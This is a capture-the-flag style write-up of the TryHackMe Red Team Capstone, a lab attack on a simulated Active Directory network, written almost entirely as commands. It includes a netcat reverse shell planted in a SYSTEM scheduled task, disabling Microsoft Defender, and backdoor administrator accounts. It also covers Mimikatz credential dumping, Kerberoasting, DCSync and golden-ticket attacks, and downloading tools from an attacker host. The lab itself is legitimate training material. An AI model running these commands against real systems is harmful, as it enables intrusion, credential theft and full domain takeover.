# TryHackMe Capstone Red Team Challenge – Detailed Writeup/Notes/Commands

This detailed writeup explains the step-by-step red team attack methodology, commands, tools, and techniques used during the TryHackMe **Red Team Capstone Challenge**

---

## Table of Contents

- [1. Initial Reconnaissance](#1-initial-reconnaissance)
  - [1.1 Network and Service Discovery](#11-network-and-service-discovery)
  - [1.2 Service-specific Enumeration](#12-service-specific-enumeration)
- [2. Gaining Initial Access](#2-gaining-initial-access)
  - [2.1 VPN and Remote Desktop Access Attempts](#21-vpn-and-remote-desktop-access-attempts)
- [3. Post-Exploitation: Escalation and Enumeration](#3-post-exploitation-escalation-and-enumeration)
  - [3.1 Enumeration and Context Mapping](#31-enumeration-and-context-mapping)
  - [3.2 Scheduled Task Abuse for Privilege Escalation](#32-scheduled-task-abuse-for-privilege-escalation)
  - [3.3 AV and EDR Evasion](#33-av-and-edr-evasion)
  - [3.4 Persistence](#34-persistence)
  - [3.5 Advanced Active Directory Reconnaissance](#35-advanced-active-directory-reconnaissance)
  - [3.6 Credential Dumping and Post-Exploitation Instrumentation](#36-credential-dumping-and-post-exploitation-instrumentation)
  - [3.7 BloodHound / SharpHound Data Collection](#37-bloodhound--sharphound-data-collection)
  - [3.8 Kerberos Attacks](#38-kerberos-attacks)
  - [3.9 Lateral Movement and Active Directory Object Abuse](#39-lateral-movement-and-active-directory-object-abuse)
- [4. File Transfer and Remote Tool Usage](#4-file-transfer-and-remote-tool-usage)
- [5. Additional AD and Lateral Techniques](#5-additional-ad-and-lateral-techniques)
- [6. Useful Administrative and Verification Commands](#6-useful-administrative-and-verification-commands)
- [Summary](#summary)

---

## 1. Initial Reconnaissance

### 1.1 Network and Service Discovery

Performed comprehensive network reconnaissance to identify hosts, open ports, and available services:
```
dirb http://vpn.thereserve.loc /usr/share/dirb/wordlists/common.txt # Found /vpn directory, VPN OVPN files
dirb http://mail.thereserve.loc /usr/share/dirb/wordlists/common.txt # Discovered /index.php and other files

nmap -sC -sV -Pn 10.200.116.13 # Basic service/version scan on target host
nmap -p 3389 10.200.116.0/24 # Scan RDP (3389) on subnet
nmap -p 80,443,3389,22,25,587 -T4 10.200.0.0/16 # Scan common services across subnet
nmap -sC -sV -Pn 10.200.116.11 # Scan specific host with more ports
nmap -Pn -p 443,80 10.200.116.0/24 --open # Scan open HTTP/HTTPS ports on subnet

ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u https://TargetDomain.com -H "Host: FUZZ.TargetDomain.com" # Virtual host fuzzing for subdomains
```
### 1.2 Service-specific Enumeration

Scanned and enumerated particular services for vulnerabilities and valid accounts:
```
nikto -h mail.thereserve.loc # Web server vulnerability scanning

hydra -L UserNames.txt -P Password.txt mail.thereserve.loc smtp # SMTP brute-force for user enumeration
```
---
## 2. Gaining Initial Access

### 2.1 VPN and Remote Desktop Access Attempts

Attempted internal network access via VPN and Remote Desktop Protocol (RDP):
```
openvpn [user].ovpn # Connect to VPN using OVPN config

xfreerdp /u:[username] /p:[password] /v:10.200.116.11 /sec:tls /cert:ignore # RDP connection attempts
xfreerdp /u:[username] /p:[password] /v:10.200.116.21 # RDP after successful VPN connection
mstsc /v:TARGET_HOSTNAME # Native Windows RDP client
```
---
## 3. Post-Exploitation: Escalation and Enumeration

### 3.1 Enumeration and Context Mapping

Collected system information and reviewed current privileges immediately post-access:
```
whoami /priv
ipconfig
hostname
netstat -ano
tasklist
```
### 3.2 Scheduled Task Abuse for Privilege Escalation

Enumerated and hijacked scheduled tasks running as SYSTEM for privilege escalation:
```
schtasks /query /fo csv /v | findstr "SYSTEM" > tasks.csv # List all SYSTEM tasks
schtasks /query /fo list /tn FULLSYNC /v # Details of FULLSYNC scheduled task
icacls C:\SYNC\sync.bat # Check permissions on task script
c:\Users$$user]\Downloads\nc.exe -e cmd.exe 127.0.0.1 4444 # Reverse shell payload inserted in sync.bat
.\nc.exe -lvnp 4444 # Listener on attacking machine
schtasks /run /tn FULLSYNC # Run the task manually to trigger reverse shell
```
### 3.3 AV and EDR Evasion

Used PowerShell to disable defender protections and exclude working directories:
```
Set-MpPreference -ExclusionPath "C:\Users$$user]\Downloads*"
Set-MpPreference -DisableRealtimeMonitoring $true
Get-MpComputerStatus | Select AntivirusEnabled, RealTimeProtectionEnabled
```
### 3.4 Persistence

Created a new local administrator account for persistent access:
```
net user newadmin P@ssw0rd! /add
net localgroup administrators newadmin /add
```
### 3.5 Advanced Active Directory Reconnaissance

Loaded PowerView for comprehensive AD enumeration:
```
Import-Module .\PowerView.ps1
Useful commands:

Get-NetDomain
Get-NetDomainController
Get-NetDomainTrust
Get-NetUser
Get-NetUser [username]
Get-NetGroup
Get-NetGroupMember "Domain Admins"
Get-NetLocalGroupMember
Get-NetComputer -FullData
Find-LocalAdminAccess
Find-UserSession -UserName [targetusername]
Get-NetForest
Get-NetDomainTrust
```
Additional PowerShell helper commands:
```
New-Item -Path "subhash1234.txt" -ItemType File
Set-Content -Path "C:\path\to\file.txt" -Value "Hello, this is some text"
(Get-CimInstance Win32_operatingsystem).OSArchitecture
whoami /groups
```
### 3.6 Credential Dumping and Post-Exploitation Instrumentation

Launched Mimikatz for dumping credentials and hashes:
```
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
sekurlsa::minidump lsass.DMP
lsadump::secrets
lsadump::sam
```
### 3.7 BloodHound / SharpHound Data Collection

Collected AD data using SharpHound and set up SMB share for exfiltration:
```
.\SharpHound.exe -c all

New-SMBShare -name "loot$" -path "C:\users$$user]\Downloads" -FullAccess "[user]@corp.thereserve.loc"
```
On attacker machine:
```
smbclient \\10.200.116.22\loot$ -U [user]@corp.thereserve.loc
lcd /root/sharphound
get 20250726204159_users.json
mget *
```
### 3.8 Kerberos Attacks

Executed Kerberoasting and Kerberos ticket manipulation:
```
Rubeus.exe kerberoast /outfile:hashes.txt
Rubeus.exe kerberoast
hashcat -m 13100 -a 0 hash.txt wordlist.txt

Rubeus.exe monitor /interval:10 /nowrap
Rubeus.exe dump

mimikatz # token::elevate
mimikatz # kerberos::ptt ticket.kirbi

lsadump::dcsync /user:Administrator@corp.thereserve.loc

sekurlsa::pth /user:Administrator /domain:corp.thereserve.loc /ntlm:[hash] /run:"mstsc.exe /restrictedadmin"
```
### 3.9 Lateral Movement and Active Directory Object Abuse

Performed lateral movement and user/group management:
```
mstsc /v:server1.corp.local
PsExec.exe \corpdc.corp.thereserve.loc cmd.exe
Enter-PSSession -ComputerName corpdc.corp.thereserve.loc

New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value "0" -PropertyType DWORD -Force
Get-ItemPropertyValue 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server' fDenyTSConnections
shutdown /r

$pwd = ConvertTo-SecureString "Password1!" -AsPlainText -Force
New-ADUser -Name corpdcuser -AccountPassword $pwd -PasswordNeverExpires $true -Enabled $true
$User = Get-ADUser -Identity corpdcuser -Server "corpdc.corp.thereserve.loc"
$Group = Get-ADGroup -Identity "Domain Admins" -Server "corpdc.corp.thereserve.loc"
Add-ADGroupMember -Identity $Group -Members $User -Server "corpdc.corp.thereserve.loc"
Add-ADGroupMember -Identity "Remote Desktop Users" -Members corpdcuser
```
Enumerated forests and trusts:
```
Get-NetForest
Get-NetDomainTrust
Get-ADForest | Format-List *
Get-ADGroup "Enterprise Admins" -Server rootdc.thereserve.loc
```
Golden Ticket and advanced escalation process:
```
lsadump::dcsync /user:krbtgt@corp.thereserve.loc

kerberos::golden /user:krbtgt /domain:corp.thereserve.loc /sid:[SID] /sids:[EnterpriseAdminSID] /service:krbtgt /rc4:[krbtgtHash] /ptt

dir \rootdc.thereserve.loc\c$
PsExec.exe \rootdc.thereserve.loc cmd.exe
```
---
## 4. File Transfer and Remote Tool Usage

Transferred tools using built-in servers and clients:
```
On attacker machine

python3 -m http.server 8000
On Windows victim

Invoke-WebRequest -Uri "http://YOUR-IP:8000/mytool.exe" -OutFile "C:\Temp\mytool.exe"
On Linux victim

wget http://YOUR-IP:8000/mytool
curl -o mytool http://YOUR-IP:8000/mytool
```
---
## 5. Additional AD and Lateral Techniques
```
Get-NetComputer -Unconstrained -Properties Name, DNSHostName, SamAccountName, OperatingSystem # Find unconstrained delegation

.\SpoolSample\SpoolSample.exe corpdc.corp.thereserve.loc server1.corp.thereserve.loc # Machine authentication coercion

whoami /groups
whoami /priv
```
---
## 6. Useful Administrative and Verification Commands
```
net user [username] /domain
net group "Help Desk" /domain

shutdown /r
curl ipinfo.io
```
---
## Summary

This writeup covers the full lifecycle of the Capstone Red Team attack on a Windows Active Directory environment:

- Network and service enumeration
- Initial access via VPN and RDP
- Privilege escalation abusing misconfigured scheduled tasks
- Defender and AV evasion using PowerShell
- Persistence through user account creation
- Advanced AD enumeration with PowerView and SharpHound
- Credential dumping with Mimikatz
- Kerberos attacks (Kerberoasting, DCSync, Golden Ticket)
- Lateral movement and domain dominance techniques

---
